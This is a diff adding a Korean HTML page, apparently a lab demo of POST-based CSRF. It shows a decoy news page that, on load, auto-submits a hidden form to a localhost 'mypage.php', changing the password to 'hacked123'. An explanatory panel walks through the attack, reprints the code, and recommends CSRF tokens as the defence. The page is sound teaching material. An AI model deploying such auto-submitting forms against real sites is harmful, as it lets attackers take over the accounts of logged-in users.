@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>📰 오늘의 뉴스</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: 'Segoe UI', sans-serif; background: #f9fafb; margin: 0; padding: 30px 20px; }
+    .news { max-width: 700px; margin: 0 auto; }
+    .header { font-size: 1.5rem; font-weight: 700; border-bottom: 3px solid #1a3a6b; padding-bottom: 10px; margin-bottom: 20px; }
+    .article { background: white; border-radius: 8px; padding: 20px; margin-bottom: 20px; box-shadow: 0 1px 4px rgba(0,0,0,.08); }
+    .article h2 { font-size: 1.1rem; margin: 0 0 8px; color: #111; }
+    .article p  { color: #555; font-size: 14px; line-height: 1.6; margin: 0; }
+
+    /* 공격 분석 패널 */
+    .panel { background: white; border-radius: 8px; padding: 24px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,.1); }
+    .panel h2 { color: #1f2937; margin: 0 0 14px; }
+    .code-box { background: #1e1e1e; color: #d4d4d4; padding: 14px 18px; border-radius: 6px; font-family: monospace; font-size: 13px; line-height: 1.7; margin: 10px 0; overflow-x: auto; }
+    .hl-tag  { color: #569cd6; }
+    .hl-attr { color: #9cdcfe; }
+    .hl-val  { color: #ce9178; }
+    .hl-cmt  { color: #6a9955; }
+    .step { display: flex; gap: 12px; margin: 10px 0; align-items: flex-start; }
+    .num  { background: #7c3aed; color: white; width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 13px; flex-shrink: 0; }
+    .warn { background: #fef3c7; border-left: 4px solid #f59e0b; padding: 10px 14px; border-radius: 0 6px 6px 0; margin: 10px 0; font-size: 13px; }
+    .vs { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin: 10px 0; }
+    .vs-item { padding: 12px; border-radius: 6px; font-size: 13px; }
+    .vs-item.bad  { background: #fee2e2; border: 1px solid #fca5a5; }
+    .vs-item.good { background: #d1fae5; border: 1px solid #6ee7b7; }
+    .vs-item strong { display: block; margin-bottom: 6px; }
+    code { background: #f1f5f9; padding: 2px 6px; border-radius: 3px; font-size: 12px; }
+  </style>
+</head>
+<body>
+<div class="news">
+  <!-- 피해자에게 보이는 화면: 평범한 뉴스 사이트 -->
+  <div class="header">📰 오늘의 뉴스</div>
+  <div class="article">
+    <h2>AI 기술이 바꾸는 금융 서비스의 미래</h2>
+    <p>인공지능 기술의 발전으로 금융권에서도 자동화 바람이 불고 있다. 각 은행들은 AI 기반 심사 시스템을...</p>
+  </div>
+  <div class="article">
+    <h2>사이버 보안 전문가들이 경고하는 올해의 위협</h2>
+    <p>보안 전문가들은 올해 가장 위험한 공격 벡터로 CSRF와 피싱 복합 공격을 꼽았다. 사용자들의 주의가...</p>
+  </div>
+</div>
+
+<!--
+  ══════════════════════════════════════════════════════════════════
+  ❌ CSRF 공격 코드 — 피해자에게는 보이지 않는 자동 제출 폼
+
+  이 폼은 페이지 로드 후 JavaScript로 자동 제출됩니다.
+  피해자의 브라우저에서 localhost:8083 (마이페이지)으로
+  세션 쿠키를 포함한 POST 요청이 전송됩니다.
+  ══════════════════════════════════════════════════════════════════
+-->
+<form id="csrf-attack"
+      method="POST"
+      action="http://localhost:8083/mypage.php"
+      style="display:none">
+  <input type="hidden" name="action"       value="change_password">
+  <input type="hidden" name="new_password" value="hacked123">
+</form>
+
+<script>
+  // 페이지 로드 즉시 폼 자동 제출
+  window.onload = function() {
+    document.getElementById('csrf-attack').submit();
+  };
+</script>
+
+<!-- ── 공격 원리 설명 패널 (학습용) ── -->
+<div style="max-width:700px; margin: 30px auto 0;">
+  <div class="panel">
+    <h2>🔍 POST CSRF 공격 원리</h2>
+
+    <div class="step">
+      <div class="num">1</div>
+      <div>피해자(victim)는 마이페이지(localhost:8083)에 <strong>로그인된 상태</strong>로 세션 쿠키를 보유합니다.</div>
+    </div>
+    <div class="step">
+      <div class="num">2</div>
+      <div>공격자가 만든 뉴스 사이트(localhost:8084)로 피해자를 유인합니다. (낚시 메일, SNS 등)</div>
+    </div>
+    <div class="step">
+      <div class="num">3</div>
+      <div>페이지 로드 시 숨겨진 폼이 <strong>자동 제출</strong>됩니다:</div>
+    </div>
+
+    <div class="code-box">
+<span class="hl-cmt">&lt;!-- 숨겨진 공격 폼 --&gt;</span>
+<span class="hl-tag">&lt;form</span> <span class="hl-attr">id</span>=<span class="hl-val">"csrf-attack"</span>
+      <span class="hl-attr">method</span>=<span class="hl-val">"POST"</span>
+      <span class="hl-attr">action</span>=<span class="hl-val">"http://localhost:8083/mypage.php"</span>
+      <span class="hl-attr">style</span>=<span class="hl-val">"display:none"</span><span class="hl-tag">&gt;</span>
+  <span class="hl-tag">&lt;input</span> <span class="hl-attr">type</span>=<span class="hl-val">"hidden"</span> <span class="hl-attr">name</span>=<span class="hl-val">"action"</span>       <span class="hl-attr">value</span>=<span class="hl-val">"change_password"</span><span class="hl-tag">&gt;</span>
+  <span class="hl-tag">&lt;input</span> <span class="hl-attr">type</span>=<span class="hl-val">"hidden"</span> <span class="hl-attr">name</span>=<span class="hl-val">"new_password"</span> <span class="hl-attr">value</span>=<span class="hl-val">"hacked123"</span><span class="hl-tag">&gt;</span>
+<span class="hl-tag">&lt;/form&gt;</span>
+
+<span class="hl-tag">&lt;script&gt;</span>
+  window.onload = () => document.getElementById(<span class="hl-val">'csrf-attack'</span>).submit();
+<span class="hl-tag">&lt;/script&gt;</span>
+    </div>
+
+    <div class="step">
+      <div class="num">4</div>
+      <div>브라우저가 <strong>세션 쿠키 자동 첨부</strong> → 서버는 피해자의 정상 요청으로 인식</div>
+    </div>
+    <div class="step">
+      <div class="num">5</div>
+      <div>피해자 계정의 비밀번호가 <code>hacked123</code>으로 변경됩니다. 계정 탈취 완료!</div>
+    </div>
+
+    <div class="warn">
+      ⚡ <strong>GET vs POST CSRF의 차이</strong>: POST는 &lt;img&gt; 태그로 공격 불가.
+      하지만 숨겨진 폼 + JS 자동 제출로 동일하게 공격 가능합니다.
+    </div>
+  </div>
+
+  <div class="panel">
+    <h2>⚔️ GET 방식 vs POST 방식 CSRF 비교</h2>
+    <div class="vs">
+      <div class="vs-item bad">
+        <strong>❌ GET CSRF</strong>
+        공격 난이도: 쉬움<br>
+        <code>&lt;img src="..."&gt;</code><br>
+        브라우저 자동 요청만으로 완료
+      </div>
+      <div class="vs-item bad">
+        <strong>❌ POST CSRF</strong>
+        공격 난이도: 쉬움<br>
+        <code>&lt;form&gt; + JS submit()</code><br>
+        자동 폼 제출로 완료
+      </div>
+    </div>
+    <p style="font-size:13px">👉 POST라고 해서 안전하지 않습니다! <strong>CSRF 토큰</strong>이 핵심 방어책입니다.</p>
+  </div>
+</div>
+</body>
+</html>
